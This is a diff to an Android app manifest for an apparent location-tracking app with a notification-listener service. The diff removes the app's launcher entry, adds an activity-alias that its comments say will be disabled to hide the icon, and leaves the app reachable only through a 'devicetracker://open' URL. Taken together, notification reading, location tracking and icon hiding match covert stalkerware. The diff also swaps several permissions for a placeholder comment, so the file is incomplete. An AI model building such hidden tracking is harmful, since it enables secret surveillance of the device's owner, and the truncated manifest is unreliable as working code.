@@ -1,18 +1,18 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- Permissions remain the same -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-    <uses-permission android:name="android.permission.INTERNET"/>
+    <!-- ... all other permissions -->
     <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
         android:label="location_tracking_app"
         android:name="${applicationName}"
         android:icon="@mipmap/ic_launcher">
 
+        <!-- STEP 1: MainActivity no longer has the LAUNCHER intent. -->
+        <!-- It is now opened ONLY by the custom URL scheme. -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -22,22 +22,30 @@
             android:hardwareAccelerated="true"
             android:windowSoftInputMode="adjustResize">
 
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
-            </intent-filter>
-
+            <!-- The custom URL scheme intent filter STAYS HERE -->
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
                 <category android:name="android.intent.category.BROWSABLE" />
-                <!-- Define the scheme and host for your URL -->
-                <!-- The URL will be "devicetracker://open" -->
                 <data android:scheme="devicetracker" android:host="open" />
             </intent-filter>
 
         </activity>
 
+        <!-- STEP 2: ADD THIS NEW ACTIVITY-ALIAS -->
+        <!-- This alias acts as the launcher icon. We will disable THIS to hide the icon. -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+
+        <!-- The rest of the file (service, meta-data) remains the same -->
         <service
             android:name=".NotificationTrackerService"
             android:exported="true"
